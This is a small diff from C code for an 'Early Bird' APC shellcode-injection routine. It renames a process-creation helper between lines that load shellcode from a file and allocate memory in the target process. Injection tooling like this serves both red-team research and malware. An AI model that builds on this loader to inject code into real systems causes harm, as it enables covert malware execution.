@@ -163,7 +163,7 @@ BOOL EarlyBirdApcInjection(IN DWORD dwCreationFlag, IN LPCSTR lpProcessName, IN 
 	if (!FetchShellcode(lpShellcodePath, &pShellcode, &sShellcodeSize))
 		return FALSE;
 
-	if (!RunProcess(dwCreationFlag, lpProcessName, &hProcess, &hThread, &dwProcessId))
+	if (!CreateNewProcess(dwCreationFlag, lpProcessName, &hProcess, &hThread, &dwProcessId))
 		return FALSE;
 
 	if (!AllocateMemory(NULL, hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
